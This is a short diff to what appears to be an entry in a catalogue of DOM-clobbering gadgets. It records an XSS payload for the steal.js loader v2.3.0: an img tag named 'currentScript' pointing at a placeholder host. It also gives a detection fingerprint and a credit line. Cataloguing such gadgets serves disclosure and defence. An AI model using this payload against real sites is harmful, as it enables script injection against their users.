@@ -6,9 +6,10 @@
 + Stars: 1.4K
 + Version: v2.3.0
 + Fingerprint: `typeof window.steal !== 'undefined' && typeof window.steal.loader === 'object'`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx">```
++ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>```
 + Impact: XSS
 + CVE: N/A
++ Status: Mitre
 + Foundby: TheHulk
 + TheThing: None
 
